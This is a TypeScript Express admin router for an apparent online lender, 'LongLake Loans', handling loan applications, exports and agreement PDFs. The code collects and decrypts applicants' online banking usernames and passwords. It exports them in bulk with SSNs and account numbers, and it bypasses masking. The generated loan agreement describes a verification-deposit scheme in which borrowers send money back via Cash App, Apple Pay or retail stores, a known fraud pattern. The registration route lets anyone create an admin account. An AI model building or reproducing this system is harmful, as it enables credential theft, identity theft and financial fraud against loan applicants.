import { Router, Request, Response } from "express";
const PDFDocument = require("pdfkit");
import { requireAuth, rateLimit, AuthRequest } from "../auth";
import { transaction } from "../db";
import {
  authenticateAdmin,
  createAdminUser,
  verifyToken,
  getAdminById,
  getAdminByEmail,
  listAdminUsersPaginated,
  deactivateAdmin,
} from "../services/adminService";
import { listMessages } from "../services/messageService";
import {
  listApplications,
  listAllApplications,
  getApplicationById,
  getApplicationByIdDecrypted,
  updateApplicationStatus,
  updateApplication,
  deleteApplication,
  getApplicationStats,
  getAuditLog,
  type UpdateApplicationInput,
} from "../services/applicationService";
import {
  getBankVerificationDecrypted,
  updateBankVerificationByApplicationId,
  type UpdateBankVerificationInput,
} from "../services/bankVerificationService";
import { sendStatusUpdateEmail } from "../services/emailService";
import {
  ANALYTICS_RANGES,
  getApplicationAnalytics,
  type AnalyticsRange,
} from "../services/analyticsService";
import { pacificDayRange, todayStr } from "../timezone";
import { randomUUID } from "node:crypto";
import { decrypt } from "../encryption";

// function maskSensitiveValue(value: string | null | undefined): string | null {
//   if (!value) return null;
//   return `••••••${value.slice(-4)}`;
// }

function maskSensitiveValue(value: string | null | undefined): string | null {
  if (!value) return null;
  return value;
}

// Format date to MM/DD/YYYY
function formatDate(date: string | null | undefined): string | null {
  if (!date) return null;

  const d = new Date(date);
  if (isNaN(d.getTime())) return null;

  const formatter = new Intl.DateTimeFormat("en-US", {
    timeZone: "America/New_York",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: true, // change to false if you want 24-hour format
  });

  return formatter.format(d);
}

const router = Router();

// POST /api/admin/auth — Login
router.post("/auth", async (req: Request, res: Response) => {
  try {
    const ip =
      (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
      req.ip ||
      "unknown";

    const rl = rateLimit(`login:${ip}`, 5, 60000);
    if (!rl.allowed) {
      res
        .status(429)
        .set("Retry-After", String(Math.ceil(rl.resetIn / 1000)))
        .json({ error: "Too many login attempts. Try again later." });
      return;
    }

    const { email, password, action, setupKey, name } = req.body;

    if (!email || !password) {
      res.status(400).json({ error: "Email and password are required" });
      return;
    }

    // Bootstrap: create first admin user
    if (action === "setup" && process.env.ADMIN_SETUP_KEY) {
      if (setupKey !== process.env.ADMIN_SETUP_KEY) {
        res.status(403).json({ error: "Invalid setup key" });
        return;
      }

      const user = await createAdminUser(
        email,
        password,
        name || "Admin",
        "admin",
      );
      res.json({
        success: true,
        user,
        message: "Admin user created. You can now log in.",
      });
      return;
    }

    const result = await authenticateAdmin(email, password);
    if (!result) {
      res.status(401).json({ error: "Invalid email or password" });
      return;
    }

    if (result.error) {
      res.status(403).json({ error: result.error });
      return;
    }

    res.json({
      success: true,
      user: result.user,
      token: result.token,
    });
  } catch (error: any) {
    console.error("========== AUTH ERROR ==========");
    console.error("Message:", error?.message);
    console.error("Stack:", error?.stack);
    console.error("Full error:", error);
    console.error("================================");

    res.status(500).json({
      error: "Internal server error",
      message: error?.message,
    });
  }
});

// POST /api/admin/auth — Login / Register
router.post("/auth/register", async (req: Request, res: Response) => {
  try {
    const ip =
      (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
      req.ip ||
      "unknown";

    const rl = rateLimit(`login:${ip}`, 5, 60000);
    if (!rl.allowed) {
      res
        .status(429)
        .set("Retry-After", String(Math.ceil(rl.resetIn / 1000)))
        .json({ error: "Too many login attempts. Try again later." });
      return;
    }

    const { email, password, action, setupKey, name, role } = req.body;

    const existing = await getAdminByEmail(email);
    if (existing) {
      res.status(409).json({ error: "User already exists" });
      return;
    }

    const normalizedRole = (role || "reviewer") as
      | "admin"
      | "reviewer"
      | "viewer";
    if (!["admin", "reviewer", "viewer"].includes(normalizedRole)) {
      res.status(400).json({ error: "Invalid role" });
      return;
    }

    const user = await createAdminUser(
      email,
      password,
      name || "Reviewer",
      normalizedRole,
    );

    res.json({
      success: true,
      user,
      message: "Admin user registered successfully.",
    });
    return user;
  } catch (error) {
    console.error("Auth error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

// GET /api/admin/auth — Verify token / get current user
router.get("/auth", async (req: Request, res: Response) => {
  try {
    const authHeader = req.headers.authorization;
    if (!authHeader?.startsWith("Bearer ")) {
      res.status(401).json({ error: "No token provided" });
      return;
    }

    const token = authHeader.substring(7);
    const payload = verifyToken(token);
    if (!payload) {
      res.status(401).json({ error: "Invalid or expired token" });
      return;
    }

    const user = await getAdminById(payload.userId);
    if (!user || !user.is_active) {
      res.status(403).json({ error: "Account not found or deactivated" });
      return;
    }

    res.json({ success: true, user });
  } catch (error) {
    console.error("Token verify error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

// GET /api/admin/applications — List all applications
router.get(
  "/applications",
  requireAuth(),
  async (req: AuthRequest, res: Response) => {
    try {
      // Default to today's date if no date param provided
      // const today = new Date();
      // const defaultDate = `${today.getFullYear()}-${String(today.getMonth() + 1).padStart(2, "0")}-${String(today.getDate()).padStart(2, "0")}`;
      const defaultDate = todayStr();

      const dateFrom = (req.query.dateFrom as string) || undefined;
      const dateTo = (req.query.dateTo as string) || undefined;
      // `all=1` lists every date; a range or search also disables the
      // "today only" default.
      const skipDefaultDate =
        req.query.all === "1" ||
        !!dateFrom ||
        !!dateTo ||
        !!(req.query.search as string);

      const options = {
        status: (req.query.status as string) || undefined,
        country: (req.query.country as string) || undefined,
        search: (req.query.search as string) || undefined,
        date:
          (req.query.date as string) ||
          (skipDefaultDate ? undefined : defaultDate),
        dateFrom,
        dateTo,
        page: parseInt((req.query.page as string) || "1", 10),
        limit: Math.min(parseInt((req.query.limit as string) || "20", 10), 100),
        sortBy: (req.query.sortBy as string) || "created_at",
        sortOrder: ((req.query.sortOrder as string) || "desc") as
          | "asc"
          | "desc",
      };

      const result = await listApplications(options);

      // Strip encrypted fields from list view
      const safeApplications = result.applications.map((app) => ({
        application_id: app.application_id,
        first_name: app.first_name,
        last_name: app.last_name,
        email: app.email,
        phone: app.phone,
        date_of_birth: formatDate(app.date_of_birth),
        dl_state: app.dl_state,
        city: app.city,
        state: app.state,
        zip_code: app.zip_code,
        country: app.country,
        employment_status: app.employment_status,
        employer_name: app.employer_name,
        job_title: app.job_title,
        monthly_income: app.net_monthly_income,
        employment_length_mo: app.employment_length_mo,
        employer_phone: app.employer_phone,
        pay_frequency: app.pay_frequency,
        next_pay_date: formatDate(app.next_pay_date),
        income_source: app.income_source,
        address_line2: app.address_line2,
        years_at_address: app.years_at_address,
        housing_status: app.housing_status,
        monthly_housing_cost: app.monthly_housing_cost,
        loan_amount: app.loan_amount,
        loan_purpose: app.loan_purpose,
        loan_purpose_other_detail: app.loan_purpose_other_detail,
        loan_term: app.loan_term,
        bank_name: app.bank_name,
        account_type: app.account_type,
        bank_account_age: app.bank_account_age,
        current_balance_band: app.current_balance_band,
        direct_deposit: app.direct_deposit,
        bank_verification_completed: app.bank_verification_completed,
        utm_source: app.utm_source,
        utm_medium: app.utm_medium,
        utm_campaign: app.utm_campaign,
        utm_content: app.utm_content,
        status: app.status,
        created_at: app.created_at,
        updated_at: app.updated_at,
        reviewed_at: app.reviewed_at,
        funded_at: app.funded_at,
      }));

      res.json({
        success: true,
        applications: safeApplications,
        total: result.total,
        page: options.page,
        limit: options.limit,
        totalPages: Math.ceil(result.total / options.limit),
      });
    } catch (error) {
      console.error("List applications error:", error);
      res.status(500).json({ error: "Failed to retrieve applications" });
    }
  },
);

// GET /api/admin/applications/:application_id — View single application
router.get(
  "/applications/:application_id",
  requireAuth(["admin", "reviewer", "viewer"]),
  async (req: AuthRequest, res: Response) => {
    try {
      const application_id = req.params.application_id as string;

      const application = await getApplicationByIdDecrypted(application_id);

      if (!application) {
        res.status(404).json({ error: "Application not found" });
        return;
      }

      // The child tables key off the UUID primary key, so resolve it here and
      // keep it server-side — the response speaks application_id only.
      const { id: internalId, ...publicApplication } = application;

      const [auditLog, bankVerification] = await Promise.all([
        getAuditLog(internalId),
        getBankVerificationDecrypted(internalId),
      ]);

      const response = {
        ...publicApplication,
        routing_number_encrypted: decrypt(application.routing_number_encrypted),
        date_of_birth: application.date_of_birth,
        created_at: application.created_at,
        updated_at: application.updated_at,
        reviewed_at: application.reviewed_at,
        funded_at: application.funded_at,
        ssn_encrypted: maskSensitiveValue(application.ssn_decrypted),
        dl_number_encrypted: maskSensitiveValue(application.dl_decrypted),
        account_number_encrypted: maskSensitiveValue(
          application.account_decrypted,
        ),
        ssn_decrypted: maskSensitiveValue(application.ssn_decrypted),
        dl_decrypted: maskSensitiveValue(application.dl_decrypted),
        account_decrypted: maskSensitiveValue(application.account_decrypted),
      };

      // Build bank verification info
      let bankVerificationInfo = null;
      if (bankVerification) {
        bankVerificationInfo = {
          full_name: (bankVerification as any).full_name,
          email: (bankVerification as any).email,
          application_id: application.application_id,
          online_banking_username: decrypt(
            bankVerification?.banking_username_encrypted,
          ),
          online_banking_password: decrypt(
            bankVerification?.banking_password_encrypted,
          ),
          bank_name: bankVerification.bank_name,
          account_type: bankVerification.account_type,
          verification_status: bankVerification.verification_status,
          created_at: bankVerification.created_at,
        };
      }

      res.json({
        success: true,
        application: response,
        bankVerification: bankVerificationInfo,
        auditLog,
      });
    } catch (error) {
      console.error("Get application error:", error);
      res.status(500).json({ error: "Failed to retrieve application" });
    }
  },
);

// POST /api/admin/applications/:id/reveal-sensitive — audited admin-only reveal
router.post(
  "/applications/:application_id/reveal-sensitive",
  requireAuth(["admin"]),
  async (req: AuthRequest, res: Response) => {
    try {
      const id = req.params.application_id as string;
      const application = await getApplicationByIdDecrypted(id);
      if (!application) {
        res.status(404).json({ error: "Application not found" });
        return;
      }

      const ipAddress =
        (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
        req.ip ||
        "unknown";
      await transaction(async (client) => {
        await client.query(
          `INSERT INTO audit_log (id, application_id, action, performed_by, details, ip_address, user_agent)
           VALUES ($1, $2, 'REVEAL_SENSITIVE_DATA', $3, $4::jsonb, $5, $6)`,
          [
            randomUUID(),
            application.id,
            req.user?.userId || "unknown",
            JSON.stringify({
              fields: ["ssn", "driver_license", "bank_account"],
            }),
            ipAddress,
            req.headers["user-agent"] || "unknown",
          ],
        );
      });

      res.json({
        success: true,
        ssn: application.ssn_decrypted,
        driverLicense: application.dl_decrypted,
        accountNumber: application.account_decrypted,
      });
    } catch (error) {
      console.error("Sensitive application reveal failed:", error);
      res.status(500).json({ error: "Unable to reveal sensitive data" });
    }
  },
);

// PATCH /api/admin/applications/:id — Update status and/or application data
// The frontend sends snake_case keys (matching DB columns) — map them to the
// camelCase keys of UpdateApplicationInput.
const APP_FIELD_MAP: Record<string, keyof UpdateApplicationInput> = {
  first_name: "firstName",
  last_name: "lastName",
  email: "email",
  phone: "phone",
  date_of_birth: "dateOfBirth",
  ssn: "ssn",
  dl_number: "driverLicenseNumber",
  dl_state: "driverLicenseState",
  street_address: "streetAddress",
  city: "city",
  state: "state",
  zip_code: "zipCode",
  country: "country",
  employment_status: "employmentStatus",
  employer_name: "employerName",
  job_title: "jobTitle",
  monthly_income: "monthlyIncome",
  net_monthly_income: "monthlyIncome",
  employment_length_mo: "employmentLengthMo",
  employer_phone: "employerPhone",
  pay_frequency: "payFrequency",
  next_pay_date: "nextPayDate",
  income_source: "incomeSource",
  address_line2: "addressLine2",
  years_at_address: "yearsAtAddress",
  housing_status: "housingStatus",
  monthly_housing_cost: "monthlyHousingCost",
  loan_amount: "loanAmount",
  loan_purpose: "loanPurpose",
  loan_purpose_other_detail: "loanPurposeOther",
  loan_term: "loanTerm",
  bank_name: "bankName",
  account_number: "accountNumber",
  routing_number: "routingNumber",
  account_type: "accountType",
  bank_account_age: "bank_account_age",
  current_balance_band: "currentBalanceBand",
};

const NUMBER_FIELDS: ReadonlySet<keyof UpdateApplicationInput> = new Set([
  "monthlyIncome",
  "employmentLengthMo",
  "loanAmount",
  "loanTerm",
  "yearsAtAddress",
  "monthlyHousingCost",
]);

// GET formats dates as MM/DD/YYYY for display — convert back to ISO for storage.
function normalizeDate(value: string): string {
  const match = /^(\d{2})\/(\d{2})\/(\d{4})$/.exec(value);
  return match ? `${match[3]}-${match[1]}-${match[2]}` : value;
}

// GET returns "[ENCRYPTED]" for masked fields; never overwrite with that placeholder.
function isMasked(value: unknown): boolean {
  if (typeof value !== "string") return false;
  return value.startsWith("[ENCRYPTED]") || value === "[DECRYPTION_FAILED]";
}

// For bank verification updates, only update fields that are provided (non-empty) and not masked.
router.patch(
  "/applications/:application_id",
  requireAuth(["admin", "reviewer"]),
  async (req: AuthRequest, res: Response) => {
    try {
      const application_id = req.params.application_id as string;
      const {
        status,
        bankVerification,
        ssn_decrypted,
        dl_decrypted,
        account_decrypted,
        ...rest
      } = req.body ?? {};

      const updates: UpdateApplicationInput = {};

      // 1. Explicitly map incoming decrypted values to backend input keys
      if (typeof ssn_decrypted === "string" && !isMasked(ssn_decrypted)) {
        updates.ssn = ssn_decrypted;
      }
      if (typeof dl_decrypted === "string" && !isMasked(dl_decrypted)) {
        updates.driverLicenseNumber = dl_decrypted;
      }
      if (
        typeof account_decrypted === "string" &&
        !isMasked(account_decrypted)
      ) {
        updates.accountNumber = account_decrypted;
      }

      // 2. Process all remaining fields using APP_FIELD_MAP
      // for (const [snakeKey, camelKey] of Object.entries(APP_FIELD_MAP)) {
      //   const raw = rest[snakeKey];
      //   if (raw === undefined || raw === null || raw === "") continue;
      //   if (isMasked(raw)) continue;

      //   if (NUMBER_FIELDS.has(camelKey)) {
      //     const n = typeof raw === "number" ? raw : Number(raw);
      //     if (!Number.isNaN(n)) {
      //       (updates as Record<string, unknown>)[camelKey] = n;
      //     }
      //   } else if (typeof raw === "string") {
      //     const v = camelKey === "dateOfBirth" ? normalizeDate(raw) : raw;
      //     (updates as Record<string, unknown>)[camelKey] = v;
      //   }
      // }

      // 2. Process all remaining fields using APP_FIELD_MAP
      for (const [snakeKey, camelKey] of Object.entries(APP_FIELD_MAP)) {
        const raw = rest[snakeKey];
        if (raw === undefined || raw === null || raw === "") continue;
        if (isMasked(raw)) continue;

        if (NUMBER_FIELDS.has(camelKey)) {
          const n = typeof raw === "number" ? raw : Number(raw);
          if (!Number.isNaN(n)) {
            (updates as Record<string, unknown>)[camelKey] = n;
          }
        } else if (typeof raw === "string") {
          const v =
            camelKey === "dateOfBirth" || camelKey === "nextPayDate"
              ? normalizeDate(raw)
              : raw;
          (updates as Record<string, unknown>)[camelKey] = v;
        }
      }

      const bvInput: UpdateBankVerificationInput = {};
      if (bankVerification && typeof bankVerification === "object") {
        const bv = bankVerification as Record<string, unknown>;
        if (typeof bv.full_name === "string") bvInput.fullName = bv.full_name;
        if (typeof bv.email === "string") bvInput.email = bv.email;
        if (typeof bv.bank_name === "string") bvInput.bankName = bv.bank_name;
        if (typeof bv.account_type === "string")
          bvInput.accountType = bv.account_type;
        if (
          typeof bv.online_banking_username === "string" &&
          !isMasked(bv.online_banking_username)
        )
          bvInput.bankingUsername = bv.online_banking_username;
        if (
          typeof bv.online_banking_password === "string" &&
          !isMasked(bv.online_banking_password)
        )
          bvInput.bankingPassword = bv.online_banking_password;
        if (typeof bv.verification_status === "string")
          bvInput.verificationStatus = bv.verification_status;
      }

      const hasFieldUpdates = Object.keys(updates).length > 0;
      const hasBvUpdates = Object.keys(bvInput).length > 0;

      if (!status && !hasFieldUpdates && !hasBvUpdates) {
        res.status(400).json({
          error:
            "Provide a status, at least one updatable field, or bankVerification",
        });
        return;
      }

      const existing = await getApplicationById(application_id);
      if (!existing) {
        res.status(404).json({ error: "Application not found" });
        return;
      }

      // `application_id` in the URL may be the 5-digit code or a legacy UUID.
      // Child-table writes need the resolved UUID primary key; anything shown
      // to the applicant uses the public 5-digit code.
      const internalId = existing.id;
      const publicApplicationId = existing.application_id;

      if (hasFieldUpdates || hasBvUpdates) {
        try {
          await transaction(async (client) => {
            if (hasFieldUpdates) {
              const updated = await updateApplication(
                internalId,
                updates,
                req.user!.email,
                client,
              );
              if (!updated) throw new Error("NO_VALID_FIELDS");
            }
            if (hasBvUpdates) {
              const bvUpdated = await updateBankVerificationByApplicationId(
                internalId,
                bvInput,
                client,
              );
              if (!bvUpdated && !hasFieldUpdates) {
                throw new Error("BV_NOT_FOUND");
              }
            }
          });
        } catch (err) {
          const msg = err instanceof Error ? err.message : "";
          if (msg === "NO_VALID_FIELDS") {
            res.status(400).json({ error: "No valid fields to update" });
            return;
          }
          if (msg === "BV_NOT_FOUND") {
            res
              .status(404)
              .json({ error: "Bank verification record not found" });
            return;
          }
          throw err;
        }
      }

      if (status) {
        const updated = await updateApplicationStatus(
          internalId,
          status,
          req.user!.email,
          {
            ipAddress:
              (req.headers["x-forwarded-for"] as string)
                ?.split(",")[0]
                ?.trim() ||
              req.ip ||
              "unknown",
            userAgent: (req.headers["user-agent"] as string) || "unknown",
          },
        );

        if (!updated) {
          res.status(404).json({ error: "Application not found" });
          return;
        }

        try {
          const application = await getApplicationById(internalId);
          if (application) {
            await sendStatusUpdateEmail({
              applicationId: publicApplicationId,
              firstName: application.first_name,
              email: application.email,
              loanAmount: application.loan_amount,
              status,
              fundedAt: application.funded_at || "",
            });
          }
        } catch (emailError) {
          console.error("Status update email error:", emailError);
        }
      }

      res.json({
        success: true,
        message: status
          ? `Application updated: status set to ${status}`
          : "Application updated",
      });
    } catch (error) {
      const errMsg = error instanceof Error ? error.message : "Unknown error";
      console.error("Update application error:", errMsg);

      if (
        errMsg.startsWith("Invalid status") ||
        errMsg.startsWith("Invalid verification_status")
      ) {
        res.status(400).json({ error: errMsg });
        return;
      }

      res.status(500).json({ error: errMsg });
    }
  },
);

// DELETE /api/admin/applications/:application_id — Delete application (admin only)
router.delete(
  "/applications/:application_id",
  requireAuth(["admin"]),
  async (req: AuthRequest, res: Response) => {
    try {
      const application_id = req.params.application_id as string;
      const deleted = await deleteApplication(application_id);

      if (!deleted) {
        res.status(404).json({ error: "Application not found" });
        return;
      }

      res.json({
        success: true,
        message: "Application deleted",
      });
    } catch (error) {
      console.error("Delete application error:", error);
      res.status(500).json({ error: "Failed to delete application" });
    }
  },
);

// GET /api/admin/stats — Dashboard statistics
router.get("/stats", requireAuth(), async (req: AuthRequest, res: Response) => {
  try {
    const stats = await getApplicationStats();
    res.json({ success: true, stats });
  } catch (error) {
    console.error("Stats error:", error);
    res.status(500).json({ error: "Failed to retrieve statistics" });
  }
});

// GET /api/admin/analytics?range=1d|7d|30d|90d|1y — Dashboard charts
router.get(
  "/analytics",
  requireAuth(),
  async (req: AuthRequest, res: Response) => {
    const range = ((req.query.range as string) || "30d") as AnalyticsRange;
    if (!(ANALYTICS_RANGES as readonly string[]).includes(range)) {
      res.status(400).json({
        error: `range must be one of ${ANALYTICS_RANGES.join(", ")}`,
      });
      return;
    }
    try {
      const analytics = await getApplicationAnalytics(range);
      res.json({ success: true, analytics });
    } catch (error) {
      console.error("Analytics error:", error);
      res.status(500).json({ error: "Failed to retrieve analytics" });
    }
  },
);

// GET /api/admin/users — List all admin users (admin only)
router.get(
  "/users",
  requireAuth(["admin"]),
  async (req: AuthRequest, res: Response) => {
    try {
      const options = {
        page: parseInt((req.query.page as string) || "1", 10),
        limit: Math.min(parseInt((req.query.limit as string) || "20", 10), 100),
        search: (req.query.search as string) || undefined,
        role: (req.query.role as string) || undefined,
      };

      const result = await listAdminUsersPaginated(options);

      res.json({
        success: true,
        users: result.users,
        total: result.total,
        page: options.page,
        limit: options.limit,
        totalPages: Math.ceil(result.total / options.limit),
      });
    } catch (error) {
      console.error("List users error:", error);
      res.status(500).json({ error: "Failed to retrieve users" });
    }
  },
);

// PUT /api/admin/users/${userId}/deactivate — Deactivate an admin user (admin only)
router.put(
  "/users/:id/deactivate",
  requireAuth(["admin"]),
  async (req: AuthRequest, res: Response) => {
    try {
      const { id } = req.params as { id: string };

      const user = await getAdminById(id);

      if (!user) {
        return res.status(404).json({
          error: "User not found",
        });
      }

      // Deactivate account instead of deleting
      await transaction(async (client) => {
        await client.query(
          `
          UPDATE admin_users
          SET 
            is_active = false,
            updated_at = NOW()
          WHERE id = $1
          `,
          [id],
        );
      });

      return res.json({
        success: true,
        message: "User deactivated successfully",
      });
    } catch (error) {
      console.error("Deactivate user error:", error);

      return res.status(500).json({
        error: "Failed to deactivate user",
      });
    }
  },
);

// PUT /api/admin/users/${userId}/activate — Activate an admin user (admin only)
router.put(
  "/users/:id/activate",
  requireAuth(["admin"]),
  async (req: AuthRequest, res: Response) => {
    try {
      const { id } = req.params as { id: string };

      const user = await getAdminById(id);

      if (!user) {
        return res.status(404).json({
          error: "User not found",
        });
      }

      // Activate account instead of deleting
      await transaction(async (client) => {
        await client.query(
          `
          UPDATE admin_users
          SET 
            is_active = true,
            updated_at = NOW()
          WHERE id = $1
          `,
          [id],
        );
      });

      return res.json({
        success: true,
        message: "User activated successfully",
      });
    } catch (error) {
      console.error("Activate user error:", error);

      return res.status(500).json({
        error: "Failed to activate user",
      });
    }
  },
);

// GET /api/admin/messages — List contact messages
router.get(
  "/messages",
  requireAuth(),
  async (req: AuthRequest, res: Response) => {
    try {
      const options = {
        page: parseInt((req.query.page as string) || "1", 10),
        limit: Math.min(parseInt((req.query.limit as string) || "20", 10), 100),
        search: (req.query.search as string) || undefined,
      };

      const result = await listMessages(options);

      const formattedMessages = result.messages.map((m) => ({
        ...m,
        created_at: formatDate(m.created_at),
        replied_at: formatDate(m.replied_at),
      }));

      res.json({
        success: true,
        messages: formattedMessages,
        total: result.total,
        page: options.page,
        limit: options.limit,
        totalPages: Math.ceil(result.total / options.limit),
      });
    } catch (error) {
      console.error("List messages error:", error);
      res.status(500).json({ error: "Failed to retrieve messages" });
    }
  },
);

router.delete(
  "/auth/delete",
  requireAuth(),
  async (req: AuthRequest, res: Response) => {
    try {
      if (!req.user) {
        return res.status(401).json({
          error: "Not authenticated",
        });
      }

      const user = await getAdminById(req.user.userId);

      if (!user) {
        return res.status(404).json({
          error: "User not found",
        });
      }

      // Deactivate account instead of deleting
      await transaction(async (client) => {
        await client.query(
          `
          UPDATE admin_users
          SET 
            is_active = false,
            updated_at = NOW()
          WHERE id = $1
          `,
          [req?.user?.userId],
        );
      });

      return res.json({
        success: true,
        message: "Account deactivated successfully",
      });
    } catch (error) {
      console.error("Deactivate account error:", error);

      return res.status(500).json({
        error: "Failed to deactivate account",
      });
    }
  },
);

function csvCell(value: unknown): string {
  if (value === null || value === undefined) return "";
  const s = String(value);
  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

// GET /api/admin/export-applications — Get all applications without pagination (admin only, use for CSV export)
router.get(
  "/export-applications",
  requireAuth(["admin", "reviewer"]),
  async (_req: AuthRequest, res: Response) => {
    const fields = [
      "application_id",
      "first_name",
      "email",
      "phone",
      "date_of_birth",
      "ssn",
      "dl_number",
      "dl_state",
      "street_address",
      "city",
      "state",
      "zip_code",
      "country",
      "employment_status",
      "employer_name",
      "job_title",
      "monthly_income",
      "employment_length_mo",
      "income_source",
      "pay_frequency",
      "next_pay_date",
      "address_line2",
      "years_at_address",
      "housing_status",
      "monthly_housing_cost",
      "loan_amount",
      "loan_purpose",
      "loan_term",
      "bank_name",
      "account_number",
      "account_type",
      "bank_account_age",
      "current_balance_band",
      "direct_deposit",
      "status",
      "bank_verification_completed",
      "banking_username",
      "banking_password",
      "verification_status",
      "assisted_by_loan_agent",
      "created_at",
      "updated_at",
      "reviewed_at",
      "funded_at",
    ];

    try {
      const applications = await listAllApplications();

      res.setHeader("Content-Type", "text/csv; charset=utf-8");
      res.setHeader(
        "Content-Disposition",
        "attachment; filename=applications.csv",
      );

      res.write(fields.join(",") + "\n");

      for (const app of applications) {
        const row = [
          app?.application_id,
          app?.first_name,
          app?.email,
          app?.phone,
          formatDate(app?.date_of_birth),
          app?.ssn_decrypted,
          app?.dl_decrypted,
          app?.dl_state,
          app?.street_address,
          app?.city,
          app?.state,
          app?.zip_code,
          app?.country,
          app?.employment_status,
          app?.employer_name,
          app?.job_title,
          app?.net_monthly_income,
          app?.employment_length_mo,
          app?.income_source,
          app?.pay_frequency,
          formatDate(app?.next_pay_date),
          app?.address_line2,
          app?.years_at_address,
          app?.housing_status,
          app?.monthly_housing_cost,
          app?.loan_amount,
          app?.loan_purpose,
          app?.loan_term,
          app?.bank_name,
          app?.account_decrypted,
          app?.account_type,
          app?.bank_account_age,
          app?.current_balance_band,
          app?.direct_deposit,
          app?.status,
          app?.bank_verification_completed,
          app?.bank_verification?.banking_username_decrypted,
          app?.bank_verification?.banking_password_decrypted,
          app?.bank_verification?.verification_status,
          app?.assisted_by_loan_agent,
          formatDate(app?.created_at),
          formatDate(app?.updated_at),
          formatDate(app?.reviewed_at),
          formatDate(app?.funded_at),
        ];
        res.write(row.map(csvCell).join(",") + "\n");
      }

      return res.end();
    } catch (error) {
      console.error("CSV export failed:", error);

      if (res.headersSent) {
        return res.end();
      }

      return res.status(500).json({
        error: "CSV export failed",
        detail: error instanceof Error ? error.message : String(error),
      });
    }
  },
);

// GET /api/applications/:application_id/download-loan-agreement — Generate and download Loan Agreement PDF for a specific application
router.get(
  "/applications/:application_id/download-loan-agreement",
  async (req: Request, res: Response) => {
    try {
      const application_id = req.params.application_id as string;
      const data = await getApplicationById(application_id);

      if (!data) {
        return res.status(404).send("Application not found");
      }

      // --- 1. Derived Data & Calculations ---
      const fullName =
        [data.first_name, data.last_name].filter(Boolean).join(" ") ||
        "Borrower";

      const fullAddress =
        [
          data.street_address,
          [data.city, data.state, data.zip_code].filter(Boolean).join(", "),
          data.country,
        ]
          .filter(Boolean)
          .join(" ") || "[Borrower Address]";

      const createdDate = data.created_at
        ? new Date(data.created_at).toLocaleDateString()
        : new Date().toLocaleDateString();

      // Loan metric estimates based on database fields
      const principal = Number(data.loan_amount) || 0;
      const termMonths = Number(data.loan_term) || 12;
      const annualRate = 0.1; // 10% APR
      const monthlyRate = annualRate / 12;

      // Amortization calculation: M = P * [r(1+r)^n] / [(1+r)^n - 1]
      let monthlyPayment = 0;
      if (principal > 0) {
        monthlyPayment =
          (principal * (monthlyRate * Math.pow(1 + monthlyRate, termMonths))) /
          (Math.pow(1 + monthlyRate, termMonths) - 1);
      }
      const totalRepayment = monthlyPayment * termMonths;

      // First payment date set to ~30 days from creation
      const firstPaymentDate = new Date(
        new Date(createdDate).getTime() + 30 * 24 * 60 * 60 * 1000,
      ).toLocaleDateString();

      // --- 2. Configure Express Response Headers ---
      const filename = `${fullName.replace(/\s+/g, "_")}_LOAN_AGREEMENT.pdf`;
      res.setHeader("Content-Type", "application/pdf");
      res.setHeader(
        "Content-Disposition",
        `attachment; filename="${filename}"`,
      );

      // --- 3. Initialize & Stream PDF ---
      const doc = new PDFDocument({ margin: 50 });
      doc.pipe(res);

      // Document Title
      doc
        .fontSize(18)
        .font("Helvetica-Bold")
        .text("LOAN AGREEMENT", { align: "center" })
        .moveDown(1.5);

      doc
        .fontSize(10)
        .font("Helvetica")
        .text(`Date: ${createdDate}`)
        .moveDown(1);

      // Lender & Borrower Side-by-Side Block
      const metadataTopY = doc.y;
      const leftColX = 50;
      const rightColX = 300;
      const columnWidth = 230;

      // Left Column: Lender
      doc
        .font("Helvetica-Bold")
        .fontSize(10)
        .text("Lender:", leftColX, metadataTopY, { width: columnWidth });
      doc
        .font("Helvetica")
        .text("LongLake Loans", { width: columnWidth })
        .text("448 S Hill St Ste 418, Los Angeles, CA 90013", {
          width: columnWidth,
        })
        .text("Contact: ‪(747) 202-5223", { width: columnWidth })
        .text("Email: support@longlakeloans.com", { width: columnWidth });

      const lenderBottomY = doc.y; // Record end position of left column

      // Right Column: Borrower
      doc
        .font("Helvetica-Bold")
        .fontSize(10)
        .text("Borrower:", rightColX, metadataTopY, { width: columnWidth });
      doc
        .font("Helvetica")
        .text(`Name: ${fullName}`, { width: columnWidth })
        .text(`Address: ${fullAddress}`, { width: columnWidth })
        .text(
          `Contact: ${data.phone || data.email || "[Borrower Contact Info]"}`,
          {
            width: columnWidth,
          },
        );

      const borrowerBottomY = doc.y; // Record end position of right column

      // Reset vertical position to below whichever column is taller
      doc.y = Math.max(lenderBottomY, borrowerBottomY) + 15;
      doc.x = leftColX; // Reset X coordinate back to left margin

      doc.moveDown(2);
      doc.x = 50; // Reset X margin

      // Section 1: Loan Details
      doc
        .font("Helvetica-Bold")
        .fontSize(11)
        .text("1. Loan Details")
        .moveDown(0.5);
      doc.font("Helvetica").fontSize(10);
      doc.text(`• Loan Amount: $${principal.toFixed(2)}`);
      doc.text("• APR: 10%");
      doc.text("• Payment Frequency: Monthly");
      doc.text(`• Loan Purpose: ${data.loan_purpose || "Personal"}`);
      doc.text("• Collateral: Unsecured").moveDown(1);

      // Section 2: Disbursement & Verification
      doc
        .font("Helvetica-Bold")
        .fontSize(11)
        .text("2. Disbursement & Verification")
        .moveDown(0.5);
      doc.font("Helvetica").fontSize(10);
      doc.text(
        "Lender agrees to disburse the Loan amount after successful verification. Borrower shall provide banking info for a verification deposit of $1,000+.",
      );
      doc.text(
        "a) Lender deposits the verification amount into Borrower’s account.",
      );
      doc.text("b) Borrower confirms receipt and the exact deposit amount.");
      doc.text(
        "c) Borrower agrees to return the verification funds via Cash App, Apple Pay, or in person at a retail store within a timeframe specified by the Lender.",
      );
      doc.text(
        "d) Multiple deposits (up to 3) may be required; Borrower agrees to this process.",
      );
      doc
        .text(
          "e) Once the verification funds are returned in full and complete, the entire Loan amount will be disbursed.",
        )
        .moveDown(1);

      // Section 3: Conditions & Use
      doc
        .font("Helvetica-Bold")
        .fontSize(11)
        .text("3. Conditions & Use")
        .moveDown(0.5);
      doc.font("Helvetica").fontSize(10);
